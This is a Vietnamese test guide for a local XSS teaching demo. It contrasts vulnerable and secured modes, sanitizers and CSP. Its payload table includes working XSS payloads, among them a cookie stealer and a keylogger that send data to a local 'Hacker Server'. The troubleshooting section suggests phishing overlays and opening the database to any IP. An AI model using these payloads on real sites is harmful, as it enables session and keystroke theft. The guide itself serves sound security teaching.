# Hướng dẫn Test

## Test nhanh theo từng loại XSS

### DOM XSS — `/xss-demo`
Nhập vào ô input:
```
<img src=x onerror="alert('DOM XSS')">
```
Panel trái thực thi, panel phải hiển thị text thuần.

---

### Reflected XSS — dán URL vào browser
```
http://localhost:3000/demo/reflected-xss?msg=<script>alert('XSS')</script>
```
Xem script thực thi. So sánh với:
```
http://localhost:3000/demo/reflected-xss-fixed?msg=<script>alert('XSS')</script>
```

---

### Stored XSS — `/posts/new`

**Bước 1:** Đăng nhập, vào `/posts/new`, chọn **Vulnerable Mode**

**Bước 2:** Dùng Payload Library hoặc nhập thủ công:

| Payload | Kết quả |
|---|---|
| `<script>alert('XSS')</script>` | Alert popup |
| `<img src=x onerror="alert('IMG')">` | Alert qua img |
| `<svg onload="alert('SVG')">` | Alert qua SVG |
| `<img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)">` | Gửi cookie tới Hacker Server |
| `<script>document.onkeypress=function(e){fetch('http://localhost:4000/steal?type=key&key='+e.key)}</script>` | Keylogger |

**Bước 3:** Mở bài → thấy XSS thực thi → toggle sang **Secure Mode** → XSS bị chặn

---

### Hacker Server — `http://localhost:4000`

1. Mở `http://localhost:4000` — Hacker Dashboard
2. Tạo post chứa payload keylogger (bước trên)
3. Mở bài, gõ phím → xem keystroke xuất hiện real-time trên Dashboard
4. Filter theo `key`, `cookie`, `form` — copy từng entry

---

### Security Dashboard — `/security`

1. Chọn payload từ danh sách
2. Xem 5 phương pháp xử lý: No sanitization / Entity encode / React text / Strip tags / DOMPurify
3. Toggle **CSP ON** → inline script bị browser chặn dù đã inject
4. Nhập custom payload, xem risk level (none / low / medium / high / critical)

---

## Xử lý sự cố

| Lỗi | Giải pháp |
|---|---|
| Backend không start | Chạy `npx prisma generate` rồi `npx prisma db push` |
| "Chưa đăng nhập" | Đăng nhập trước. Cookie cần `credentials: 'include'` |
| `document.cookie` trống | Đúng rồi — cookie là `httpOnly`. Dùng keylogger hoặc phishing overlay |
| Hacker Dashboard trống | Kiểm tra port 4000 đang chạy. Xem browser console |
| CORS error | Backend cho phép `localhost:5173` và `localhost:4000` — kiểm tra URL |
| MongoDB connection fail | Whitelist IP trong Atlas: Network Access → Allow from anywhere |
